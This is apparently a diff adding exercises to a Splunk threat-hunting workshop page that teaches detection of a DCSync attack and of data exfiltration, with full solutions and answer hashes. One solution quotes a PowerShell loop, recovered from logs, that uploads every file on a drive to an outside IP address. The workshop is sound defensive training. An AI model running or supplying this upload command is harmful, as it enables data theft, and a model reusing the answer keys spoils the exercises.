+                            Review the DNS requests that occur immediately before the DCSync. Which process on the infected host is making these requests? Is that process typically responsible for Active Directory communication?
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="answer-section">
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
+                <div class="answer-content">
+                    <div class="answer-label">✅ Full Solution</div>
+                    <div class="answer-text">
+                        <p><strong>Step 1: Understanding DCSync Detection</strong></p>
+                        <p>Research reveals that DCSync attacks generate Event Code 4662 (An operation was performed on an object) with specific object type GUIDs:</p>
+                        <ul>
+                            <li><code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes-All)</li>
+                            <li><code>19195a5b-6da0-11d0-afd3-00c04fd930c9</code> (Domain-DNS class WRITE_DAC)</li>
+                        </ul>
+
+                        <p><strong>Step 2: Search for DCSync Indicators</strong></p>
+                        <p>Search for Event Code 4662 with these specific object types:</p>
+                        <pre><code>index=windows EventCode=4662 ("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" OR "19195a5b-6da0-11d0-afd3-00c04fd930c9")</code></pre>
+                        <p>This returns 8 events, with 6 of them occurring at nearly the same time. All 6 events show the object type "Domain-DNS class WRITE_DAC", which is not typical activity. This clustering of events is highly indicative of a DCSync attack.</p>
+
+                        <p><strong>Step 3: Correlate with Host Activity</strong></p>
+                        <p>Narrow your time frame to ±5 minutes around the first DCSync event and examine activity on the infected host:</p>
+                        <pre><code>index=windows ComputerName="br-win10-10.site.lan" 
+| stats count by EventCode</code></pre>
+
+                        <p><strong>Step 4: Identify Process Injection</strong></p>
+                        <p>Event Code 8 (CreateRemoteThread detected) appears approximately one minute before the DCSync. Examining this event reveals that a remote thread was injected into <code>explorer.exe</code>. This is a critical finding - once a process has been injected with a remote thread, any actions originating from that process can no longer be trusted.</p>
+
+                        <p><strong>Step 5: Connect the Attack Chain</strong></p>
+                        <p>Following the timeline, <code>explorer.exe</code> immediately makes a DNS request to the Domain Controller, which is then followed by the surge in Active Directory object operations (the DCSync itself).</p>
+
+                        <p><strong>The Answer:</strong> <code>explorer.exe</code> was the process used to conduct the DCSync attack (after being compromised via remote thread injection).</p>
+
+                        <p><strong>Attack Chain Summary:</strong></p>
+                        <ol>
+                            <li>Malicious binary injects remote thread into explorer.exe (EventCode 8)</li>
+                            <li>Compromised explorer.exe performs DNS lookups to Domain Controller</li>
+                            <li>DCSync operation executes via explorer.exe, replicating AD credentials</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <p style="color: #DC143C; margin-bottom: 0.5rem; font-weight: 700;">Multiple valid formats accepted:</p>
+                    <code>b0b1bafd51c236721e1422625d4cf74fb06179a92dff37985cbcdd8f3e278e60</code><br>
+                    <code>7592a3326e8f8297547f8c170b96b8aa8f5234027fd76593841a6574f098759c</code><br>
+                    <code>a0f7213baaf23a7b303d3bd9611fc931c7018790541ff7f08e3762db81f6ae8b</code>
+                </div>
+            </div>
+
+            <div class="challenge-section">
+                <button class="challenge-reveal-button" onclick="toggleChallenge(this)">Challenge: Build a Detection</button>
+                <div class="challenge-content">
+                    <div class="challenge-text">
+                        Want to test your Splunk skills? See if you can build a detection rule for identifying DCSync attacks! Consider:
+                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                            <li>What Event Codes and object type GUIDs indicate DCSync activity?</li>
+                            <li>How can you detect abnormal clustering of these events?</li>
+                            <li>Should you alert on a single event or a threshold?</li>
+                            <li>How can you correlate with suspicious processes (like remote thread injection)?</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Exercise 7 -->
+        <div class="exercise">
+            <div class="exercise-number">Exercise 7</div>
+
+            <div class="instruction-section">
+                <div class="instruction-label">📋 Instructions</div>
+                <div class="instruction-text">
+                    You've tracked the threat actor through initial access, credential theft, and Active Directory compromise. Now it's time to determine if they successfully exfiltrated data from your network. This exercise requires careful analysis of network traffic patterns and correlation with endpoint activity.
+                </div>
+            </div>
+
+            <div class="question-section">
+                <div class="question-label">❓ Question</div>
+                <div class="question-text">
+                    What is the IP address of the server used to exfiltrate data from the network?
+                </div>
+            </div>
+
+            <div class="hints-section">
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 1</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 1</div>
+                        <div class="hint-text">
+                            Review the network proxy data and look for any anomalous indicators. Remember - anomalies don't always mean low numbers! Sometimes high values are the red flag. What patterns seem unusual?
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 2</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 2</div>
+                        <div class="hint-text">
+                            What HTTP method would typically be seen during a data exfiltration attempt? Think about how data is sent to remote servers. Filter your searches accordingly.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="hint-item">
+                    <button class="hint-button" onclick="toggleHint(this)">Hint 3</button>
+                    <div class="hint-content">
+                        <div class="hint-label">💡 Hint 3</div>
+                        <div class="hint-text">
+                            Do you see any familiar indicators of compromise (IOCs) from your previous investigation? Also, look closely at all destinations - not all of them may be domains. Some might be direct IP addresses.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="answer-section">
+                <button class="reveal-button" onclick="toggleAnswer(this)">Show Full Solution</button>
+                <div class="answer-content">
+                    <div class="answer-label">✅ Full Solution</div>
+                    <div class="answer-text">
+                        <p><strong>Step 1: Search for Exfiltration Activity</strong></p>
+                        <p>Knowing that data may have been exfiltrated, search the proxy logs for POST requests from the infected host:</p>
+                        <pre><code>index=proxy src_ip=172.16.4.110 http_method=POST</code></pre>
+
+                        <p><strong>Step 2: Analyze Initial Findings</strong></p>
+                        <p>Reviewing the traffic, you'll immediately notice POST requests to <code>daybed.net</code> (the domain identified in earlier exercises) with extremely suspicious-looking URLs containing long encoded strings. However, examining the <code>bytes_in</code> field reveals relatively small data sizes - this doesn't align with actual data exfiltration.</p>
+
+                        <p><strong>Step 3: Identify the Real Exfiltration Server</strong></p>
+                        <p>Continuing your review of POST requests, you'll find traffic to a hardcoded IP address: <code>75.170.124.62</code>. Search specifically for this destination:</p>
+                        <pre><code>index=proxy src_ip=172.16.4.110 http_method=POST url="http://75.170.124.62:8443/"</code></pre>
+                        <p>This returns multiple events with significantly larger data volumes: <code>bytes_in=5608837</code>, <code>bytes_in=792826874</code>, etc. These byte counts are consistent with actual data exfiltration.</p>
+
+                        <p><strong>Step 4: Confirm with Endpoint Logs</strong></p>
+                        <p>To confirm this is indeed exfiltration activity, pivot to the Windows logs:</p>
+                        <pre><code>index=windows "75.170.124.62"</code></pre>
+                        <p>This search returns PowerShell Script Block logs (Event Code 4104) showing the exact command that was executed:</p>
+                        <pre><code>Get-ChildItem "S:\" -File | ForEach-Object { 
+    try { 
+        (New-Object System.Net.WebClient).UploadFile("http://75.170.124.62:8443", $_.FullName) 
+    } catch { 
+        Write-Host "Failed: $($_.Name)" 
+    } 
+}</code></pre>
+
+                        <p><strong>The Answer:</strong> <code>75.170.124.62</code></p>
+
+                        <p><strong>What Happened:</strong></p>
+                        <p>The threat actor successfully uploaded the entire <code>S:\</code> drive to a server hosted at IP address <code>75.170.124.62</code> using PowerShell's WebClient UploadFile method. The large byte counts in the proxy logs confirm substantial data was transmitted.</p>
+
+                        <p><strong>Important Note:</strong> In Squid proxy logs, <code>bytes_in</code> actually represents data going OUT of the network (counterintuitive, but accurate). This is crucial for building effective exfiltration detections.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hash-spoiler">
+                <button class="hash-reveal-button" onclick="toggleHash(this)">Reveal Answer Hash</button>
+                <div class="hash-content">
+                    <code>759b4e69e64095eec477b20a7bd9af02a853ceb6f243658b68bdc3d3152bc94f</code>
+                </div>
+            </div>
+
+            <div class="challenge-section">
+                <button class="challenge-reveal-button" onclick="toggleChallenge(this)">Challenge: Build a Detection</button>
+                <div class="challenge-content">
+                    <div class="challenge-text">
+                        Want to test your Splunk skills? See if you can build a detection rule for data exfiltration! Consider:
+                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                            <li>What HTTP methods indicate data being sent out?</li>
+                            <li>What threshold of <code>bytes_in</code> should trigger an alert?</li>
+                            <li>How can you distinguish between legitimate file uploads and exfiltration?</li>
+                            <li>Should you look for patterns like multiple large uploads in a short time period?</li>
+                            <li>How can you correlate proxy logs with PowerShell execution logs?</li>
+                        </ul>
+                        <p style="margin-top: 1rem; color: #7d9eb5;"><strong>Pro Tip:</strong> Play around with Squid's bytes fields. Remember that <code>bytes_in</code> represents data going OUTSIDE of the network (yes, it's confusing!). Tune your detection by analyzing normal vs. abnormal byte counts for POST requests.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Completion Message -->
+        <div class="info-box" style="background: linear-gradient(135deg, rgba(139, 0, 0, 0.2) 0%, rgba(220, 20, 60, 0.2) 100%); border-color: #DC143C;">
+            <div class="info-box-title" style="color: #DC143C;">🎉 Workshop Complete!</div>
+            <p style="color: #ffffff;">Congratulations! You've successfully tracked a complete attack chain from initial access through data exfiltration. You've learned to:</p>
+            <ul style="color: #cccccc; padding-left: 2rem; margin-top: 0.5rem;">
+                <li>Identify malicious binaries and their execution patterns</li>
+                <li>Trace download sources and social engineering techniques</li>
+                <li>Recognize advanced attack methods like AS-REPRoasting and DCSync</li>
+                <li>Correlate activity across multiple log sources</li>
+                <li>Detect data exfiltration through network analysis</li>
+            </ul>
+            <p style="margin-top: 1rem; color: #ffffff;">Use these skills to build robust detections and hunt for threats in your own environment!</p>
+        </div>
+
     </div>
 
     <script>
@@ -417,6 +1292,45 @@
                 button.classList.remove('active');
             } else {
                 answerContent.classList.add('show');
+                button.classList.add('active');
+            }
+        }
+
+        function toggleHint(button) {
+            const hintContent = button.nextElementSibling;
+            const isShowing = hintContent.classList.contains('show');
+            
+            if (isShowing) {
+                hintContent.classList.remove('show');
+                button.classList.remove('active');
+            } else {
+                hintContent.classList.add('show');
+                button.classList.add('active');
+            }
+        }
+
+        function toggleHash(button) {
+            const hashContent = button.nextElementSibling;
+            const isShowing = hashContent.classList.contains('show');
+            
+            if (isShowing) {
+                hashContent.classList.remove('show');
+                button.classList.remove('active');
+            } else {
+                hashContent.classList.add('show');
+                button.classList.add('active');
+            }
+        }
+
+        function toggleChallenge(button) {
+            const challengeContent = button.nextElementSibling;
+            const isShowing = challengeContent.classList.contains('show');
+            
+            if (isShowing) {
+                challengeContent.classList.remove('show');
+                button.classList.remove('active');
+            } else {
+                challengeContent.classList.add('show');
                 button.classList.add('active');
             }
         }
